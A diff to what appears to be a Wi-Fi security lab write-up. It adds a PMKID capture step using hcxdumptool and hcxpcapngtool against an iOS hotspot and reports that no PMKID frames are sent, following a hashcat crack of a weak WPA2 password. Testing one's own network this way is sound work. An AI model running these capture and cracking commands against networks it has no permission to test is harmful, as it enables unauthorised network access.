@@ -186,3 +186,23 @@ hashcat -m 22000 ~/Desktop/hash.hc22000 -a 0 <<< "weakpassword123"
 * KEY FOUND: `weakpassword123`
 * Device: Apple M2 GPU — cracked in 0 seconds
 * Demonstrates GPU vs CPU cracking performance gap
+
+---
+
+### 🔹 Step 6 — PMKID Attack Attempt
+
+```bash
+sudo hcxdumptool -i wlan0 -w pmkid_capture.pcapng -c 6a --rds=2 --exitoneapol=1
+```
+
+```bash
+hcxpcapngtool -o pmkid_hash.hc22000 pmkid_capture.pcapng
+```
+
+📸 **SCREENSHOT**
+![PMKID Attempt](screenshots/09_pmkid_attempt.png)
+
+> ⚠️ **Finding:** iOS Personal Hotspot does not broadcast PMKID frames.
+> Apple intentionally restricts PMKID transmission as a security measure.
+> EAPOL handshake pairs were captured instead (fallback to standard WPA2 handshake method).
+> This confirms that PMKID attack vector is **not effective against iOS hotspots**.
